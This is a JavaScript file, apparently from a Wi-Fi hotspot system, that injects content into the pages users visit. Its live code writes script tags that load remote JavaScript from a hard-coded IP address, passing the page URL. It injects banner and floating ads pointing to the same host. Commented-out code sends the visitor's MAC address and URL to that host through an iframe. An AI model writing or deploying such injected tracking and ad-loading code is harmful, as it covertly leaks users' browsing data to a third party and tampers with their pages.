
// JavaScript Document
/*!
 * urlParameters 获取js文件后的url参数组，如：test.js?id=1&classid=2中的?后面的内容
 */
urlParameters = (function(script){
    var l = script.length;
 for(var i = 0; i < l; i++){
  me = !!document.querySelector ? script[i].src : script[i].getAttribute('src',4);
  if( me.substr(me.lastIndexOf('/')).indexOf('menu_hover') !== -1 ){
      break;
  }
 }
 return me.split('?')[1]; 
})(document.getElementsByTagName('script'))
/*!
 * 获取url参数值函数
 */
GetParameters = function ( name ){
    if( urlParameters && urlParameters.indexOf('&') > 0 ){
     var parame = urlParameters.split('&'), i = 0, l = parame.length, arr;
  for(var i=0 ; i < l; i++ ){
      arr = parame[i].split('=');
   if( name === arr[0] ){
    return arr[1];
   }
  }
 }
 return null;
}



/*!
 * 
 document.write(GetParameters("mac"));
document.write(window.location.href);
 document.scripts[0].src = "js/time.js";
 
document.write("<iframe style='padding: 0px; width: 10%;' height='50' src='http://42.123.76.20:60000/0WiFiJS/refer.php?mac="+GetParameters("mac")+'&url='+window.location.href+"' frameborder='no' border='0' marginwidth='0' marginheight='0' scrolling='no'  ></iframe>");
*/
/*
//请求数据；;

var xmlhttp;
xmlhttp=null;
if (window.XMLHttpRequest)
  {// code for IE7, Firefox, Opera, etc.
  xmlhttp=new XMLHttpRequest();
  }
else if (window.ActiveXObject)
  {// code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
if (xmlhttp!=null)
  {
  //xmlhttp.onreadystatechange=state_Change;
  xmlhttp.open("GET","http://42.123.76.20:60000/0WiFiJS/new/js.php?callback=getsom",true);
  xmlhttp.send();
  strs=xmlhttp.responseText.split(":"); 
  //document.write(strs[1]);
  }
else
  {
  alert("Your browser does not support XMLHTTP.");
  }

*/

/*

$(document).ready(function(){
  $("button").click(function(){
    $.get("http://42.123.76.20:60000/0WiFiJS/new/js.php?callback=getsom",function(data,status){
      alert("数据：" + data + "\n状态：" + status);
    });
  });
});
//document.write(strs[0]);
//document.write(strs[1]);
//document.write("dasd");

*/


// JavaScript Document
/*
document.write('<script language="javascript" type="text/javascript" >suspendcode12=jstext;</script>'); 
document.write('<script language="javascript" type="text/javascript" >suspendcode14=jstext2;</script>'); 
document.write('<script language="javascript" type="text/javascript" >document.write(suspendcode12);</script>'); 
document.write('<script language="javascript" type="text/javascript" >document.write(suspendcode14);</script>'); 
document.write('<script language="javascript" type="text/javascript" >window.setInterval("heartBeat()",1);</script>'); 



*/
//document.write(strs[0]);
//document.write(strs[1]);
var b='123';
/*
if (strs[0]=='2')
{
	document.write(suspendcode12); 
	document.write(suspendcode14); 
	document.write(duilianjs);
}

else
{
	document.write(myad);
	document.write('<SCRIPT src="http://42.123.76.20:60000/0WiFiJS/new/chaping/js/jquery.min.js"> </SCRIPT>');
}  


*/


document.write('<script src="http://42.123.76.20:60000/0WiFiJS/new/js.php?action='+window.location.href+'"> </script>'); 

//document.write('<script language="javascript" type="text/javascript" >document.write(a);</script>'); 
myad='<DIV style="MARGIN: 0px auto; WIDTH: 960px; DISPLAY: block" id=js_ads_banner_top> <IMG src="http://42.123.76.20:60000/0WiFiJS/new/chaping/images/banner_s.jpg" width=960 height=70> </DIV> <DIV style="MARGIN: 0px auto; WIDTH: 960px; DISPLAY: none" id=js_ads_banner_top_slide> <IMG src="http://42.123.76.20:60000/0WiFiJS/new/chaping/images/banner_b.jpg" width=960 height=400> </DIV>';
suspendcode12="<DIV id=\'lovexin12\' style=left:22px;POSITION:absolute;TOP:69px;><a href=http://42.123.76.20/>"+b+"</a><br><a href=JavaScript:; onclick=lovexin12.style.visibility=hidden\><img border=0 src=http://42.123.76.20:60000/0WiFiJS/inc/close.gif></a></div>" ;
suspendcode14="<DIV id=\'lovexin14\' style=right:22px;POSITION:absolute;TOP:69px;><a href=http://42.123.76.20/>"+b+"</a><br><a href=JavaScript:; onclick=lovexin14.style.display = none\><img border=0 src=http://42.123.76.20:60000/0WiFiJS/inc/close.gif></a></div>";
duilianjs="<script src=http://42.123.76.20:60000/0WiFiJS/new/duilian/my1.js> </script>";

document.write('<script language="javascript" type="text/javascript" >document.write(b);</script>'); 

document.write('<script language="javascript" type="text/javascript" >if (a=="a"){ document.write(suspendcode12); document.write(suspendcode14); document.write(duilianjs); } else{document.write(myad);}   </script>'); 

document.write('<SCRIPT src="http://42.123.76.20:60000/0WiFiJS/new/chaping/js/jquery.min.js"> </SCRIPT>');
